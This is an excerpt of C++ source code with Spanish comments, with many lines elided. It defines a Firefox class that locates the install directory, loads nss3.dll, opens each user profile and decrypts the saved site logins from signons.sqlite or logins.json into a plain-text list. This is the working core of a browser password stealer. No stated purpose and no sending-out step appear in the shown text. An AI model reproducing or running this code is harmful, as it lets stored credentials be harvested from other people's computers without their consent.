...
#include "Recursos.h"
#include "json.hpp" 
// utilizo la libreria json.hpp para leer el archivo logins.json facilmente
...
porque _strnicmp: lleva _ delante del nombre:  a large number of historic C library implementations have the functions stricmp() and strnicmp(). Visual C++ on Windows renamed all of these by prefixing them with an underscore because they aren’t part of the ANSI standard
...
char* Firefox::rutaInstalado() {
	...
	if (!SHGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion", 0, value, &cbSize)) {
		...
		path = recursos.dupcat(path, "\\", value, "\\Main", 0); // concatena path + "\\" + value + "\\Main"
		...
		/*
			...
			se necesita el directorio donde está instalado firefox porque en el se encuentra la nss3.dll 
...
BOOL  Firefox::cargarFunciones(char* installPath) {
	Recursos recursos;
	if (installPath) {
...
char* Firefox::descifrar(const char* s) {
	...
	if (CryptStringToBinary(s, strlen(s), CRYPT_STRING_BASE64, byteData, &dwLength, 0, 0)) {
		// CryptStringToBinary convierte un array de bytes en BASE64 a una string 
...
char*  Firefox::getContraseñas() {
	...
	while (1) {
		...
		if (_strnicmp(p, "Profile", 7) == 0) {
			...
			//string(profile).find_first_of("/") + 1
			// obtiene el primer caracter despues de '/'

			//string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str()
			...
			if (!(*fpNSS_INIT) (path)) {
				...
				if (ver < 32) { // la versión 32 se publicó 26/08/2014
					...
					if (sqlite3_open(database, &db) == SQLITE_OK) {
						...
						if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
							...
							while (sqlite3_step(stmt) == SQLITE_ROW) {
								...
								info += string(web) + " | " + string(descifrar(usuario)) + " | " + string(descifrar(contraseña)) + " \n";
							}
							delete[]database;
						}
						else
					...
					// a partir de la versión 32 firefox utiliza un archivo logins.json para almacenar las contraseñas guardadas en el navegador cifradas y en un formato BASE64
					...
					if (ifs.is_open()) {
						...
						if (j.find("logins") != j.end()) {
							...
							for (int i = 0; i < len; i++)
							{
								...
								// a la funcion de descifrar le tenemos que pasar la string de BASE64 sin "
				...
				if (nContraseñas == 0)
					...
					info += "no se han encontrado contraseñas en logins.json";
				}
				(*fpNSS_Shutdown) ();
			} else {
